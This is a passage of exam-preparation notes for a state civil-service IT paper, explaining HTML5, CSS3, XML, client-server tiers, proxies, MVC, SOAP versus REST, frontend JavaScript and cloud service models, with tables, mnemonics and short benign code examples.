# Week 10 — Web Technologies + Cloud Technology + Cyber Security & Emerging Tech

**Syllabus §12:** HTML5, CSS3, XML, basic concept of client-server computing, web server, proxy server, web application development, MVC architecture, web services, frontend technologies.
**Syllabus §14:** Cloud computing, compute/network/storage management technologies, edge computing.
**Syllabus §13:** Secure programming techniques, OWASP top 10 vulnerabilities, concepts of IoT, blockchain, AI.

**Estimated marks: ~6 + ~4 + ~5 = ~15**

---

## 💡 Why this is the most important week in the plan

These three sections have **zero GATE coverage** and only ~139 questions across the entire state-PSC corpus. So most candidates arrive unprepared.

Yet the questions are **purely definitional** — no numericals, no derivations, no tracing. They are also directly relevant to what the Directorate of Information Technology actually does.

⭐ **These are the cheapest 15 marks in Paper-II.** Because the question pool is thin, **these notes are your primary source** — read them twice rather than hunting for more PYQs.

---

# PART A — WEB TECHNOLOGIES

## 💡 How a web page actually reaches you

Before the details, the whole picture:

```
1. You type a URL.
2. DNS turns the name into an IP address.                    (Week 8)
3. Your browser opens a TCP connection and sends HTTP GET.   (Week 8)
4. A WEB SERVER returns the HTML.
5. The browser parses the HTML into the DOM tree.
6. It requests the CSS (styling) and JavaScript (behaviour).
7. CSS is applied; JavaScript runs and may modify the DOM.
8. If data is needed, JavaScript makes an AJAX call to an
   APPLICATION SERVER, which queries the DATABASE.
```

⭐ **The three languages divide the work cleanly:**
- **HTML** = **structure** (what is on the page)
- **CSS** = **presentation** (what it looks like)
- **JavaScript** = **behaviour** (what it does)

⭐ Keeping these three separate is the central discipline of web development — the same "separation of concerns" idea that MVC (§5) applies at the server.

---

## 1. ⭐ HTML5

### 💡 What HTML is

**HTML** = HyperText Markup Language. It is a **markup** language, not a programming language — it has no variables, loops or logic. It simply **tags** content to say what each piece *is*.

```html
<!DOCTYPE html>
<html>
  <head>                          <!-- metadata, not displayed -->
    <title>My Page</title>
    <link rel="stylesheet" href="style.css">
  </head>
  <body>                          <!-- the visible content -->
    <h1>Heading</h1>
    <p>A paragraph.</p>
  </body>
</html>
```

## 1.1 ⭐⭐ Semantic elements

### 💡 The idea

Before HTML5, every layout block was a `<div>`:
```html
<div id="header">...</div>
<div id="nav">...</div>
<div id="content">...</div>
```
A browser, a screen reader or a search engine sees only "a box, a box, a box" — the meaning exists only in your `id` names, which are arbitrary.

⭐ **HTML5 introduced SEMANTIC elements that carry meaning:**
```html
<header>...</header>
<nav>...</nav>
<main><article>...</article></main>
<footer>...</footer>
```

📌 ⭐ **The HTML5 semantic elements:** `<header>` `<footer>` `<nav>` `<section>` `<article>` `<aside>` `<main>` `<figure>` `<figcaption>` `<time>` `<mark>` `<details>` `<summary>`

⭐ **Why it matters:** accessibility (screen readers can jump to `<nav>`), SEO (search engines understand `<article>`), and maintainability.

⚠⭐ **Three categories to distinguish:**

| Category | Elements | Note |
|---|---|---|
| ⭐ **Semantic** | `<article>`, `<section>`, `<header>`, `<nav>`, `<aside>`, `<footer>`, `<main>` | Convey **meaning** |
| ⭐ **Non-semantic** | `<div>`, `<span>` | Deliberately meaning-free generic containers |
| ⭐ **Presentational (deprecated)** | `<b>`, `<i>`, `<font>`, `<center>`, `<big>` | Describe *appearance* — CSS's job now |

🔢 *"Which of the following is a semantic element introduced in HTML5?"* → the answer is whichever of `<article>`, `<section>`, `<header>`, `<nav>`, `<aside>`, `<footer>` appears. `<div>`, `<span>`, `<b>` are the distractors.

## 1.2 ⭐ Other HTML5 features

| Feature | 💡 What it does |
|---|---|
| ⭐ **`<canvas>`** | A **bitmap** drawing surface, scripted with JavaScript (games, charts) |
| **`<svg>`** | **Vector** graphics — scalable without loss, XML-based |
| ⭐ **`<audio>` / `<video>`** | Native media playback, ⭐ **no plugin needed** (this is what killed Flash) |
| ⭐ **New input types** | `email`, `url`, `number`, `date`, `range`, `color`, `search`, `tel` — with ⭐ **built-in browser validation** |
| **New form attributes** | `required`, `placeholder`, `pattern`, `autofocus`, `autocomplete` |
| ⭐ **Web Storage** | See §1.3 |
| **Geolocation API** | Access the device's location |
| **Web Workers** | Run JavaScript on a **background thread**, so the UI does not freeze |
| **WebSockets** | A **persistent, full-duplex** connection — unlike HTTP's request/response |
| **Drag and drop, offline app cache** | |

⚠ `<canvas>` vs `<svg>`: canvas is **pixel**-based (fast for many objects, but not scalable and not searchable); SVG is **vector**-based (scalable, each shape is a DOM element).

## 1.3 ⭐⭐ Web Storage vs Cookies

### 💡 The problem

HTTP is **stateless** (Week 8) — the server forgets you between requests. So how does a site remember you are logged in, or what is in your shopping cart? You need client-side storage.

| | ⭐ **localStorage** | ⭐ **sessionStorage** | ⭐ **Cookies** |
|---|---|---|---|
| ⭐ **Lifetime** | ⭐ **Persists until explicitly cleared** (survives browser restart) | ⭐ **Cleared when the TAB/session closes** | Until its expiry date |
| ⭐ **Capacity** | ~5–10 MB | ~5–10 MB | ⭐ **~4 KB only** |
| ⭐ **Sent to the server?** | ⭐ **❌ No** | ❌ No | ⭐ **✅ With EVERY HTTP request** |
| Scope | Origin (domain) | Origin **+ that tab** | Domain and path |
| Accessible to JS | ✅ | ✅ | ✅ (unless `HttpOnly`) |

⭐ **The practical consequences:**
- ⭐ **Cookies are the only one automatically sent to the server** — which is why session tokens live there, and also why they must be protected (§13).
- ⭐ **Cookies are tiny (4 KB)** and add overhead to every single request, so do not use them for bulk data.
- **localStorage persists; sessionStorage does not.** Use sessionStorage for a single-visit workflow, localStorage for user preferences.

## 1.4 Structure and common tags

**Tables:** `<table>`, `<tr>` (row), `<th>` (header cell), `<td>` (data cell), `<thead>`, `<tbody>`, with `colspan` and `rowspan`.
**Lists:** `<ul>` (unordered), `<ol>` (ordered), `<dl>`/`<dt>`/`<dd>` (definition).
**Links:** `<a href="...">`, with `target="_blank"` to open in a new tab.
**Images:** `<img src="..." alt="...">` — ⭐ **`alt` is required for accessibility** (screen readers) and shows if the image fails to load.

⭐ **Forms — `GET` vs `POST` method** (see also Week 8's HTTP methods):

| | `method="GET"` | `method="POST"` |
|---|---|---|
| Data goes in | The **URL** (visible, bookmarkable, logged) | The **request body** |
| Size limit | Yes (URL length) | ⭐ **None practical** |
| Cacheable / bookmarkable | ✅ | ❌ |
| Use for | Searches, filters (idempotent reads) | ⭐ **Logins, uploads, anything that changes state** |

---

## 2. ⭐⭐ CSS3

### 💡 What CSS is

**CSS** = Cascading Style Sheets. It separates **appearance** from **structure**, so one stylesheet can restyle a thousand pages.

```css
selector {
    property: value;
}

h1 { color: navy; font-size: 24px; }
```

### ⭐ Three ways to apply it

| Method | How | Note |
|---|---|---|
| **Inline** | `<p style="color:red">` | Highest specificity, but unmaintainable |
| **Internal** | `<style>` block in `<head>` | Page-specific |
| ⭐ **External** | `<link rel="stylesheet" href="style.css">` | ⭐ **Best practice** — cacheable and reusable across pages |

## 2.1 ⭐⭐ Specificity — "the cascade"

### 💡 The idea

Several rules may target the same element with conflicting values. Which wins? That is what the **C** in "Cascading" means — a defined order of precedence.

📌 ⭐⭐ **`!important` > Inline style > ID (#) > Class (.) / attribute / pseudo-class > Element (tag) > Universal (*) > inherited**

⭐ Specificity is often scored as a tuple **(inline, ID, class, element)** and compared left to right. So **one ID selector beats any number of class selectors** — you cannot out-vote it with quantity.

📌 ⭐ **When specificity TIES, the rule that appears LATER wins.**

### 🔢 Worked example

```html
<p id="intro" class="lead">Hello</p>
```
```css
p          { color: black; }   /* element:   0,0,0,1 */
.lead      { color: blue;  }   /* class:     0,0,1,0 */
#intro     { color: green; }   /* ID:        0,1,0,0  ← WINS */
```
⭐ The text is **green**. Adding ten more class rules would not change that.

If you added `<p id="intro" class="lead" style="color:red">`, it would be **red** (inline beats ID). And `p { color: purple !important; }` would beat even that.

## 2.2 ⭐ Selectors

| Selector | Matches |
|---|---|
| `*` | Everything (**universal**) |
| `p` | All `<p>` elements (**type/element**) |
| `.cls` | Elements with `class="cls"` |
| `#id` | The element with that `id` |
| `A B` | **Descendant** — any B inside an A |
| ⭐ `A > B` | ⭐ **DIRECT CHILD** — only immediate children |
| `A + B` | **Adjacent sibling** — the B immediately after an A |
| `A ~ B` | **General sibling** — any B after an A |
| `[attr="val"]` | Attribute selector |
| `:hover`, `:focus`, `:nth-child(n)`, `:first-child` | **Pseudo-classes** (state) |
| `::before`, `::after`, `::first-line` | **Pseudo-elements** (generated content) |

⚠ ⭐ **`A B` (descendant, any depth) vs `A > B` (direct child only)** is a standard question.

## 2.3 ⭐⭐⭐ The box model

### 💡 The idea

Every element is a rectangular box built of four concentric layers:

```
┌─────────────────────────────────────┐
│            MARGIN (outside)         │  ← space between this box and others
│  ┌───────────────────────────────┐  │
│  │          BORDER               │  │  ← the visible edge
│  │  ┌─────────────────────────┐  │  │
│  │  │       PADDING           │  │  │  ← space between content and border
│  │  │  ┌───────────────────┐  │  │  │
│  │  │  │     CONTENT       │  │  │  │  ← the text/image itself
│  │  │  └───────────────────┘  │  │  │
│  │  └─────────────────────────┘  │  │
│  └───────────────────────────────┘  │
└─────────────────────────────────────┘
```

📌 ⭐⭐ **From the content outwards: CONTENT → PADDING → BORDER → MARGIN**

⚠⚠ ⭐ **PADDING is INSIDE the border; MARGIN is OUTSIDE it.** Reversing these is the single most common CSS exam error.

💡 **Memory hook:** *padding* is the cushioning **inside** a parcel; the *margin* is the empty space you leave **around** it on the shelf.

📌 **Default (`box-sizing: content-box`):**
**Total rendered width = width + 2×padding + 2×border** (plus margin for spacing)
📌 **With `box-sizing: border-box`:** the declared `width` **includes** padding and border — usually what designers actually want.

### 🔢 Worked example

```css
div { width: 200px; padding: 10px; border: 5px solid; margin: 20px; }
```
**Content-box (default):**
```
Rendered element width = 200 + (10×2) + (5×2) = 200 + 20 + 10 = 230 px
Total horizontal space occupied = 230 + (20×2) = 270 px
```
⭐ **Element width = 230 px; space occupied = 270 px.**

**Border-box:**
```
Rendered element width = 200 px  (content shrinks to 200 − 20 − 10 = 170 px)
Total space occupied   = 240 px
```

## 2.4 Positioning and layout

| `position` value | 💡 Behaviour |
|---|---|
| `static` | Default — normal document flow |
| `relative` | Offset from its normal position, but **still occupies its original space** |
| ⭐ `absolute` | ⭐ **Removed from the flow**; positioned relative to the nearest **positioned** ancestor |
| `fixed` | Relative to the **viewport** — does not scroll |
| `sticky` | Behaves relative until a scroll threshold, then fixed |

**`display`:** `block` (full width, new line) · `inline` (flows in text, ignores width/height) · `inline-block` (flows but accepts dimensions) · `none` (removed entirely) · `flex` · `grid`

⭐ **Flexbox** — **one-dimensional** layout (a row or a column). Key properties: `justify-content` (main axis), `align-items` (cross axis), `flex-direction`.
⭐ **CSS Grid** — **two-dimensional** layout (rows *and* columns). Key properties: `grid-template-columns`, `grid-gap`.
**Float and `clear`** — the legacy layout mechanism, largely superseded.

## 2.5 ⭐ Responsive design

### 💡 The idea

One site must work on a 360 px phone and a 2560 px monitor. **Responsive design** adapts the layout to the viewport rather than shipping a separate mobile site.

📌 ⭐ **Media queries are the core mechanism:**
```css
@media screen and (max-width: 768px) {
    .sidebar { display: none; }
    .content { width: 100%; }
}
```

⭐ **The techniques:** fluid grids (percentages, not fixed pixels) · flexible images (`max-width: 100%`) · the **viewport meta tag** · **breakpoints** · ⭐ **MOBILE-FIRST design** — write the smallest-screen styles first, then add complexity upward with `min-width` queries (simpler CSS, better performance on the constrained devices).

**CSS3 additions:** `border-radius` · `box-shadow` · gradients · **transitions** and **transforms** · **animations** · web fonts (`@font-face`) · `opacity` · RGBA/HSL colours · multi-column layout.

---

## 3. ⭐⭐ XML

### 💡 What XML is for

**HTML displays data. XML describes and transports data.**

```xml
<student>
    <rollno>101</rollno>
    <name>Amit</name>
    <marks>85</marks>
</student>
```

⭐ **The key difference from HTML: XML tags are USER-DEFINED.** There is no fixed vocabulary — you invent tags to suit your data. XML is therefore a *meta*-language: a set of rules for creating markup languages.

⭐ XML is **case-sensitive**, and it is designed to be both human-readable and machine-parseable.

## 3.1 ⭐⭐ Well-formed vs valid

### 💡 The distinction

⭐ **Well-formed** = obeys XML's **syntax** rules.
⭐ **Valid** = well-formed **AND** conforms to a declared **DTD or XML Schema** (i.e. the right tags in the right structure with the right data types).

| | ⭐ **Well-formed** | ⭐ **Valid** |
|---|---|---|
| Requirement | Correct **syntax** | Correct syntax **+ conforms to a grammar** |
| Checked by | Any XML parser | A **validating** parser |
| Needs a DTD/XSD? | ❌ No | ✅ Yes |

📌 ⭐⭐ **Every VALID document is WELL-FORMED, but not every well-formed document is valid.** This one-way implication is the standard question.

💡 **Analogy:** *"Colourless green ideas sleep furiously"* is grammatically **well-formed** English but semantically nonsense. Similarly, XML can have perfect syntax while violating the schema you intended.

⭐ **Rules for well-formedness:**
1. ⭐ Exactly **one ROOT element**
2. Every tag **closed** (`<br/>` for empties)
3. Tags properly **nested** (`<a><b></b></a>`, never `<a><b></a></b>`)
4. Attribute values **quoted**
5. **Case-sensitive** matching (`<Name>` ≠ `</name>`)
6. Reserved characters **escaped**: `&lt;` `&gt;` `&amp;` `&quot;` `&apos;`

## 3.2 ⭐ DTD vs XSD

| | **DTD** (Document Type Definition) | ⭐ **XSD** (XML Schema Definition) |
|---|---|---|
| ⭐ **Written in** | Its own **non-XML** syntax | ⭐ **XML itself** |
| ⭐ **Data types** | ⭐ **❌ None** (everything is text) | ⭐ **✅ Rich types** (integer, date, decimal, custom) |
| Namespace support | ❌ | ✅ |
| Extensible | Limited | ✅ |
| Status | Older | ⭐ **Preferred today** |

⭐ **The two exam facts: XSD is written in XML, and XSD supports data types while DTD does not.**

## 3.3 ⭐ Related technologies

| Technology | ⭐ Purpose |
|---|---|
| ⭐ **XSLT** | ⭐ **TRANSFORMS** XML into another format — HTML, text, or different XML |
| ⭐ **XPath** | ⭐ **NAVIGATES / QUERIES** nodes within an XML document (`/students/student[2]/name`) |
| **XQuery** | Queries XML data (SQL-for-XML) |
| **XSL-FO** | Formatting for print output |
| ⭐ **DOM vs SAX** | Two **parsing** APIs — see below |
| **Namespaces** | Prevent element-name collisions (`xmlns:h="..."`) |

⚠ ⭐ **XSLT transforms; XPath navigates.** A common pairing question.

⭐ **DOM vs SAX parsing:**

| | **DOM** | ⭐ **SAX** |
|---|---|---|
| Approach | Builds the **whole tree in memory** | ⭐ **Event-driven, streaming** |
| Access | ⭐ **Random access**, can modify | ⭐ **Forward-only, read-only** |
| Memory | ⭐ **Heavy** (whole document) | ⭐ **Light** (one element at a time) |
| Best for | Small documents you need to edit | ⭐ **Huge documents you only read** |

## 3.4 ⭐ XML vs JSON

| | **XML** | ⭐ **JSON** |
|---|---|---|
| Verbosity | Verbose (closing tags) | ⭐ **Compact** |
| Data types | Text (typed only via XSD) | ⭐ **Native**: string, number, boolean, array, object, null |
| Parsing | Needs an XML parser | ⭐ **Native to JavaScript** (`JSON.parse`) |
| Comments | ✅ | ⭐ **❌ Not supported** |
| Attributes / namespaces | ✅ | ❌ |
| Typical use | Enterprise systems, **SOAP**, configuration | ⭐ **REST APIs, web and mobile** |

🔢 The same data:
```xml
<student><name>Amit</name><marks>85</marks></student>
```
```json
{"name": "Amit", "marks": 85}
```
⭐ JSON's brevity and native JS support are why it displaced XML for web APIs.

---

## 4. ⭐⭐ Client–server computing and servers

## 4.1 ⭐ Architecture tiers

### 💡 The idea — why split an application at all

If all the logic lives on the client, then a business-rule change means reinstalling software on 500 machines, and every client needs direct database credentials. Splitting the application into **tiers** solves both.

| Architecture | Layers | 💡 Note |
|---|---|---|
| **1-tier** | Everything on one machine | A standalone desktop app |
| **2-tier** | **Client + database server** | The client holds the business logic → a **"fat client"**. Changes need redeployment; the client needs DB credentials |
| ⭐ **3-tier** | ⭐ **Presentation + Application (business logic) + Data** | The standard web architecture |
| **n-tier** | Further split (web tier, app tier, service tier, data tier) | Large enterprise systems |

⭐ **Why 3-tier won:**
- **Scalability** — add more application servers independently of the database
- **Maintainability** — change business rules in one place
- ⭐ **Security** — the client **never touches the database directly**
- Layers can evolve independently

⭐ **Thin vs thick (fat) client:**

| | ⭐ **Thin client** | ⭐ **Thick / fat client** |
|---|---|---|
| Processing | Minimal — relies on the server | Substantial, done locally |
| Example | A **browser**-based app | A desktop application |
| ✅ Pros | ⭐ **Easy central maintenance**, no install | Responsive; works **offline** |
| ❌ Cons | ⭐ **Needs constant connectivity** | Hard to deploy and update |

## 4.2 ⭐ Other models

**Peer-to-peer** — no central server; every node is both client and server (BitTorrent, blockchain).
⭐ **Microservices vs monolith** — a monolith is one large deployable unit (simple, but you must redeploy everything for one change); microservices are many small independently deployable services (scalable and independently updatable, but with network complexity and distributed-systems problems).
**Serverless** — you deploy functions; the provider handles all servers and scaling.
⭐ **Stateful vs stateless** — HTTP is stateless (Week 8); state is layered on with cookies, server-side sessions or tokens (JWT).

## 4.3 ⭐⭐ Server types

| Server | 💡 Role | Examples |
|---|---|---|
| ⭐ **Web server** | ⭐ **Serves STATIC content over HTTP** (HTML, CSS, JS, images) | ⭐ **Apache HTTP Server, Nginx, IIS** |
| ⭐ **Application server** | ⭐ **Executes BUSINESS LOGIC / dynamic content**; provides transactions, security, connection pooling | ⭐ **Tomcat, JBoss/WildFly, WebLogic, WebSphere** |
| ⭐ **Proxy server** | An **intermediary** between client and server | Squid, Nginx |
| **Database server** | Hosts the DBMS | MySQL, PostgreSQL, Oracle |
| **Mail / DNS / File server** | Named by function | |

⚠⚠ ⭐ **Web server vs application server** is a guaranteed question:
- ⭐ A **web server** handles HTTP and serves files.
- ⭐ An **application server** runs the application code.
⭐ In practice Nginx or Apache sits **in front of** Tomcat, serving static files itself and passing dynamic requests back.

## 4.4 ⭐⭐⭐ Forward vs reverse proxy

### 💡 The idea — the same box, two opposite jobs

A **proxy** is a middleman. Which side it protects determines its name.

```
FORWARD PROXY (protects/serves the CLIENTS):

  [Clients] ──► [Forward Proxy] ──► Internet ──► [Server]
                      ▲
              sits in front of the clients;
              the server sees only the proxy's IP


REVERSE PROXY (protects/serves the SERVERS):

  [Client] ──► Internet ──► [Reverse Proxy] ──► [Server 1]
                                  │        ├──► [Server 2]
                                  │        └──► [Server 3]
                      sits in front of the servers;
                      the client sees only the proxy
```

| | ⭐ **Forward proxy** | ⭐ **Reverse proxy** |
|---|---|---|
| ⭐ **Sits in front of** | ⭐ **THE CLIENTS** | ⭐ **THE SERVERS** |
| ⭐ **Hides** | ⭐ **The client's identity** from the server | ⭐ **The backend servers** from the client |
| ⭐ **Typical uses** | Content filtering, anonymity, LAN-wide caching, bypassing geo-restrictions | ⭐ **LOAD BALANCING, SSL termination, caching, compression, security (WAF)** |
| Example | A corporate or school web proxy | ⭐ **Nginx in front of app servers; a CDN edge node** |

⚠⚠ ⭐ **"Which proxy provides load balancing?" → REVERSE proxy.** This exact question is common. Learn the pair as a unit: *forward = clients, reverse = servers.*

**General proxy benefits:** caching (lower latency and bandwidth) · anonymity · access control · logging and auditing.

---

## 5. ⭐⭐ MVC architecture

### 💡 The idea

Put database queries, HTML generation and request handling all in one file and you get an unmaintainable mess: a designer cannot change the layout without risking the SQL, and the logic cannot be tested without a browser.

⭐ **MVC separates an application into three parts with strictly defined responsibilities:**

| Component | ⭐ Responsibility | Knows about |
|---|---|---|
| ⭐ **Model** | ⭐ **DATA + BUSINESS LOGIC**; database interaction | ⭐ **Nothing about the UI** |
| ⭐ **View** | ⭐ **PRESENTATION / UI** — renders the model for the user | The model (read-only) |
| ⭐ **Controller** | ⭐ **HANDLES USER INPUT**, invokes model operations, and **selects which view to render** | Both |

⭐ **The flow:**
```
User action ──► CONTROLLER ──► updates MODEL ──► VIEW reads model ──► response to user
```

### 🔢 A concrete example

A user submits a login form:
1. The **Controller** receives the POST, extracts the username and password
2. It asks the **Model** (`User.authenticate(...)`) to check the credentials against the database
3. Depending on the result, the Controller chooses the **View**: the dashboard template or the "invalid login" template
4. The **View** renders HTML and it is sent back

⭐ **Advantages:** separation of concerns · parallel development (a designer works on views while a developer works on models) · testability (the model can be unit-tested with no browser) · reusable views · easier maintenance.

⭐ **Variants:**
- **MVP (Model-View-Presenter)** — the Presenter handles all UI logic; the View is entirely passive (easier to test).
- **MVVM (Model-View-ViewModel)** — the ViewModel exposes bindable state and the View **data-binds** to it. Used by **Angular**, WPF, Vue.

**MVC frameworks:** Spring MVC (Java) · ASP.NET MVC · Django (calls it MTV) · Ruby on Rails · Laravel · Struts · CodeIgniter.

---

## 6. ⭐⭐⭐ Web services and APIs

### 💡 The idea

A **web service** lets **software talk to software** over a network, rather than software talking to a human. Your travel site queries an airline's service; your app fetches data from a server.

## 6.1 ⭐⭐⭐ SOAP vs REST

### 💡 The essential distinction

⭐ **SOAP is a PROTOCOL** — a strict, formal standard specifying the exact message envelope, error format, and a machine-readable contract. Built for enterprise: banking, telecoms, anywhere you need guaranteed transactions and formal security.

⭐ **REST is an ARCHITECTURAL STYLE** — not a standard, but a set of *principles* for using HTTP the way it was designed. Lightweight, and what essentially every modern web/mobile API uses.

| | ⭐ **SOAP** | ⭐ **REST** |
|---|---|---|
| ⭐ **Nature** | ⭐ **A PROTOCOL** (rigid standard) | ⭐ **An ARCHITECTURAL STYLE** (guidelines) |
| ⭐ **Message format** | ⭐ **XML ONLY** (Envelope/Header/Body) | ⭐ **JSON, XML, HTML, plain text** |
| Transport | HTTP, SMTP, TCP, JMS | ⭐ **HTTP only** |
| ⭐ **Contract** | ⭐ **WSDL** (mandatory, machine-readable) | OpenAPI/Swagger (optional) |
| State | Can be stateful | ⭐ **Stateless** |
| Overhead | ⭐ **Heavy** | ⭐ **Lightweight** |
| Built-in standards | WS-Security, WS-AtomicTransaction, reliable messaging | Relies on HTTPS and OAuth |
| Caching | ⭐ **Difficult** | ⭐ **HTTP caching works naturally** |
| Error handling | Standard SOAP **Fault** | HTTP status codes |
| ⭐ **Best for** | Enterprise, banking, high-security transactions | ⭐ **Web/mobile APIs, public APIs** |

⚠⚠ ⭐ **REST is a STYLE, SOAP is a PROTOCOL.** Reversing this is the most common error in this entire section.

## 6.2 ⭐ SOAP-related standards

⭐ **WSDL (Web Services Description Language)** — an **XML** document describing the service: what operations exist, what messages they take, and where the endpoint is. ⭐ **It is the machine-readable CONTRACT**, and tools can generate client code directly from it.

⭐ **UDDI (Universal Description, Discovery and Integration)** — a **registry** for **discovering** web services. (Largely historical, but examinable.)

⭐ **SOAP envelope structure:**
```xml
<Envelope>
    <Header>   <!-- optional metadata: auth, transaction ID -->
    <Body>     <!-- the actual payload, or a <Fault> on error -->
</Envelope>
```

📌 ⭐ **Memory aid: SOAP = the message · WSDL = the contract · UDDI = the directory.**

## 6.3 ⭐⭐ REST constraints and conventions

⭐ **The six REST constraints:**
1. **Client–server** — separation of concerns
2. ⭐ **STATELESS** — each request contains everything needed; the server keeps no session state
3. **Cacheable** — responses declare whether they may be cached
4. **Uniform interface** — resources identified by URI, manipulated by standard verbs
5. **Layered system** — proxies and gateways may sit in between
6. **Code on demand** (optional)

💡 **Why statelessness matters:** any server in a farm can handle any request, so you can scale horizontally simply by adding machines. Session state would tie a user to one server.

### ⭐⭐ HTTP verbs mapped to CRUD

| Verb | CRUD | ⭐ Idempotent? | Safe? |
|---|---|---|---|
| **GET** | Read | ✅ | ✅ |
| ⭐ **POST** | Create | ⭐ **❌ NO** | ❌ |
| ⭐ **PUT** | Create / Replace | ⭐ **✅ YES** | ❌ |
| **PATCH** | Partial update | ❌ (generally) | ❌ |
| **DELETE** | Delete | ✅ | ❌ |

### 💡 What "idempotent" means, and why POST is not

📌 **Idempotent** = performing the operation **N times has the same effect as performing it once**.

🔢 **PUT /users/5** with a full record — run it five times and user 5 ends up with exactly that data. ⭐ **Idempotent** ✅
🔢 **POST /users** with a new record — run it five times and you have created ⭐ **five users**. ⭐ **NOT idempotent** ❌

⭐ **Why it matters practically:** if a network timeout leaves you unsure whether a request arrived, you can safely **retry** an idempotent one. Retrying a POST risks duplicate orders — which is why payment systems use idempotency keys.

⭐ **Richardson maturity model:** level 0 (one endpoint, RPC-style) → 1 (multiple resources) → 2 (proper HTTP verbs and status codes) → 3 (HATEOAS — responses contain links to related actions).

**API concepts:** endpoints · versioning (`/v1/`) · rate limiting · pagination · **API gateway** · ⭐ **CORS** (Cross-Origin Resource Sharing — the browser rule that a page from one origin cannot freely call another) · ⭐ **GraphQL** (a single endpoint where the **client specifies exactly which fields it wants**, avoiding both over-fetching and multiple round trips).

---

## 7. ⭐ Frontend technologies

## 7.1 JavaScript

📌 The language that runs **in the browser** (and, via **Node.js**, on the server). **Interpreted**, dynamically typed, **single-threaded** with an **event loop**.

**Types:** number, string, boolean, null, undefined, symbol, bigint, object.

⚠ ⭐ **`==` vs `===`:**
```javascript
"5" == 5     // true  — == performs TYPE COERCION
"5" === 5    // false — === compares VALUE AND TYPE
```
⭐ **Always prefer `===`.** The coercion rules of `==` are a notorious source of bugs.

⚠ ⭐ **`var` vs `let`/`const`:** `var` is **function-scoped** and **hoisted** (usable before its declaration, as `undefined`); ⭐ **`let` and `const` are BLOCK-scoped** — which is what you almost always want.

**Key concepts:** **closures** (a function remembering its enclosing scope) · hoisting · `this` · **prototypes** and prototypal inheritance · callbacks → **Promises** → `async`/`await` · arrow functions · ⭐ **event bubbling and capturing** (an event propagates up/down the DOM tree) · JSON (`JSON.parse`, `JSON.stringify`).

## 7.2 ⭐ The DOM

📌 ⭐ **The Document Object Model is a TREE representation of the document** that scripts can read and modify.

```
document
└── html
    ├── head
    │   └── title
    └── body
        ├── h1
        └── p
```

**Methods:** `getElementById`, `querySelector`, `createElement`, `appendChild`, `addEventListener`, `innerHTML`.

⚠ ⭐ **The DOM is a W3C standard API provided by the BROWSER — it is NOT part of the JavaScript language.** (Which is why Node.js has no DOM.)

## 7.3 ⭐ AJAX

📌 ⭐ **AJAX = Asynchronous JavaScript And XML** — exchanges data with the server **without reloading the page**.

💡 **Why it changed the web:** before AJAX, every interaction meant a full page reload — a blank flash and a complete re-render. AJAX made **single-page applications** (Gmail, Google Maps) possible.

Implemented with `XMLHttpRequest` or the modern ⭐ **`fetch()` API**.
⚠ ⭐ **Despite the name, AJAX usually carries JSON, not XML.**

## 7.4 ⭐ Frameworks and libraries

| Tool | 💡 Note |
|---|---|
| **jQuery** | Legacy DOM/AJAX library — simplified cross-browser scripting. Largely unnecessary now |
| ⭐ **React** | Meta/Facebook. ⭐ **A LIBRARY.** Component-based, **virtual DOM**, JSX, one-way data flow |
| ⭐ **Angular** | Google. ⭐ **A full FRAMEWORK.** TypeScript, **two-way data binding**, MVVM, opinionated |
| ⭐ **Vue.js** | Progressive framework; gentlest learning curve |
| **Bootstrap / Tailwind** | **CSS frameworks** — responsive grid systems and utility classes |
| ⭐ **Node.js** | JavaScript **runtime** (V8 engine) for the **server side**; **npm** is its package manager |
| **Webpack / Vite / Babel** | Bundlers and transpilers |

⚠ ⭐ **React is a LIBRARY; Angular is a FRAMEWORK.** (A library you call; a framework calls you.) React uses a **virtual DOM** with one-way data flow; Angular offers **two-way binding**.

💡 **What the virtual DOM does:** direct DOM manipulation is slow. React keeps a lightweight in-memory copy, **diffs** it against the previous version, and applies only the minimal set of real DOM changes.

## 7.5 ⭐ Session management

| Mechanism | 💡 How |
|---|---|
| **Cookies** | A small token stored client-side, sent with every request |
| **Server-side sessions** | The server keeps the state; the cookie holds only a session ID |
| ⭐ **JWT (JSON Web Token)** | ⭐ A **self-contained, digitally SIGNED** token: **header.payload.signature**. The server can verify it **without any stored session**, enabling ⭐ **stateless authentication** — which is what makes it fit REST |

---

# PART B — CLOUD TECHNOLOGY

## 8. ⭐⭐⭐ Cloud computing fundamentals

### 💡 What "the cloud" actually means

Traditionally, running a website meant **buying servers**: estimate your peak load, spend capital up front, wait weeks for delivery, and then either sit on idle hardware or run out of capacity.

⭐ **Cloud computing replaces owning with renting** — on demand, by the minute, over the network, with someone else operating the hardware.

💡 **The electricity analogy, which is the standard one:** in 1900 a factory generated its own power. Today you plug into the grid and pay for what you use. Cloud computing is the same shift for computing — from a *capital* purchase you operate to a *utility* you consume.

📌 **NIST definition:** on-demand network access to a shared pool of configurable computing resources, rapidly provisioned with minimal management effort.

## 8.1 ⭐⭐⭐ The five essential characteristics (NIST)

📌 ⭐ **1. On-demand self-service** — you provision resources yourself, instantly, with no human on the provider's side
📌 ⭐ **2. Broad network access** — reachable from any device over standard protocols
📌 ⭐ **3. Resource pooling (multi-tenancy)** — the provider's hardware is shared among many customers
📌 ⭐ **4. Rapid elasticity** — scale up and down quickly, automatically
📌 ⭐ **5. Measured service (pay-per-use)** — usage is metered and billed

⚠ ⭐ **Distractors that are NOT cloud characteristics:** "permanent local storage" · "dedicated hardware per customer" (that contradicts resource pooling) · "unlimited free capacity" · "no network required".

## 8.2 ⭐⭐⭐ The three service models

### 💡 The idea — how much of the stack does the provider manage?

Think of the computing stack as nine layers. The service model is simply **where the dividing line sits**.

```
                    IaaS          PaaS          SaaS
  Applications      YOU           YOU        provider
  Data              YOU           YOU        provider
  Runtime           YOU        provider      provider
  Middleware        YOU        provider      provider
  Operating System  YOU        provider      provider   ⭐ the key line
  Virtualisation  provider     provider      provider
  Servers         provider     provider      provider
  Storage         provider     provider      provider
  Networking      provider     provider      provider
```

| Model | ⭐ Customer manages | Provider manages | ⭐ Examples |
|---|---|---|---|
| ⭐ **IaaS** (Infrastructure) | ⭐ **OS, runtime, middleware, applications, data** | Virtualisation and below | ⭐ **AWS EC2, Azure VMs, Google Compute Engine** |
| ⭐ **PaaS** (Platform) | ⭐ **Applications and data ONLY** | ⭐ **+ the OS and runtime** | ⭐ **Heroku, Google App Engine, AWS Elastic Beanstalk, Azure App Service** |
| ⭐ **SaaS** (Software) | ⭐ **Nothing — you just use it** (your data/config) | ⭐ **Everything** | ⭐ **Gmail, Salesforce, Office 365, Dropbox, Zoom** |
| **FaaS / Serverless** | Individual **functions** | Everything else, including scaling | AWS Lambda, Azure Functions |

